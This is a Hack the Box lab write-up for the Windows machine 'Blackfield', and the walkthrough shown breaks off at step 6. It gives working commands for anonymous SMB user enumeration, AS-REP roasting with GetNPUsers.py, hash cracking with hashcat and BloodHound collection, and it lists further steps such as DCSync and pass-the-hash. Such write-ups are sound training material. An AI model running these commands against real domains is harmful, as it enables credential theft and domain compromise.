# Blackfield

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Hard**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="912" height="443" alt="image" src="https://github.com/user-attachments/assets/d44570cb-edcc-41f3-a6af-2078cdb5ab70" />

2. SMB allows anonymous logon. We find a profiles$ share that has a list of users so create a user list from it.

`smbclient //blackfield.local/profiles$ -U '' -c ls | awk '{print $1}' > users.list`

3. Now that we have a users list, we will try ASREPRoasting to get a user hash and gain an initial foothold in the domain.

`GetNPUsers.py -request -usersfile users.list -outputfile asreproastables.txt -dc-ip 10.129.229.17 -format hashcat 'blackfield.local/'`

<img width="910" height="108" alt="image" src="https://github.com/user-attachments/assets/097681fb-ab6e-4777-8df8-5e7f5a8b9030" />

4. Success! Now crack the hash and we get user support's credentials. 

`hashcat -m 18200 asreproastables.txt /usr/share/wordlists/rockyou.txt`

5. Now that we have a valid credentials on the domain, we run Bloodhound to enumerate the network

`sudo bloodhound-python -d blackfield.local -u support -p $(cat recon/support.pass) -ns 10.129.229.17 -c all` 

6. Load files onto Bloodhound and find a path from support user to machine


